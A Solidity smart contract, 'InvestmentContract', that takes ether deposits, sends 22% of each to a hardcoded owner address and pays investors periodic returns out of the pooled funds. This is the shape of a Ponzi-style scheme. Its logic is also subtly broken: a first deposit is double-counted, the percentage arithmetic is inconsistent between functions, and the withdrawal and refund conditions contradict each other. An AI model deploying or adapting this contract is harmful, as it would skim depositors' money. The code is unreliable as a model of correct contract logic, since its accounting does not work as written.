```solidity
pragma solidity ^0.4.25;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}

contract InvestmentContract {
    using SafeMath for uint;

    mapping(address => uint) public investments;
    mapping(address => uint) public lastInvestmentTime;
    mapping(address => uint) public totalWithdrawn;
    address public owner = 0xe06405Be05e91C85d769C095Da6d394C5fe59778;
    uint public maxInvestment = 5 ether;
    uint public chargingTime = 86400; // 1 day in seconds
    uint public projectPercent = 22;
    uint public userPercent = 2;

    function withdraw() internal {
        if (investments[msg.sender].mul(userPercent).div(100) <= totalWithdrawn[msg.sender]) {
            investments[msg.sender] = 0;
            lastInvestmentTime[msg.sender] = 0;
            totalWithdrawn[msg.sender] = 0;
        } else {
            uint payout = calculatePayout();
            lastInvestmentTime[msg.sender] = now;
            totalWithdrawn[msg.sender] = totalWithdrawn[msg.sender].add(payout);
            msg.sender.transfer(payout);
        }
    }

    function calculatePayout() public view returns (uint) {
        uint dailyProfit = investments[msg.sender].mul(userPercent).div(100000);
        uint timePassed = now.sub(lastInvestmentTime[msg.sender]).div(chargingTime);
        uint payout = dailyProfit.mul(timePassed);
        return payout;
    }

    function invest() private {
        require(msg.value <= maxInvestment, "Excess max invest");
        if (msg.value > 0) {
            if (investments[msg.sender] == 0) {
                investments[msg.sender] = msg.value;
            }
            if (investments[msg.sender] > 0 && now > lastInvestmentTime[msg.sender].add(chargingTime)) {
                withdraw();
            }
            investments[msg.sender] = investments[msg.sender].add(msg.value);
            lastInvestmentTime[msg.sender] = now;
            owner.transfer(msg.value.mul(projectPercent).div(100));
        } else {
            withdraw();
        }
    }

    function returnDeposit() private {
        uint payout = investments[msg.sender].sub(totalWithdrawn[msg.sender]).sub(investments[msg.sender].mul(projectPercent).div(100));
        require(investments[msg.sender] > payout, "You have already repaid your deposit");
        investments[msg.sender] = 0;
        lastInvestmentTime[msg.sender] = 0;
        msg.sender.transfer(payout);
    }

    struct Constants {
        uint256 maxInvestment;
        uint256 chargingTime;
        uint256 projectPercent;
        uint256 userPercent;
        address owner;
    }

    Constants public constants = Constants(
        5 ether,
        86400,
        22,
        2,
        0xe06405Be05e91C85d769C095Da6d394C5fe59778
    );

    function() external payable {
        if (msg.value == 0.000111 ether) {
            returnDeposit();
        } else {
            invest();
        }
    }
}
```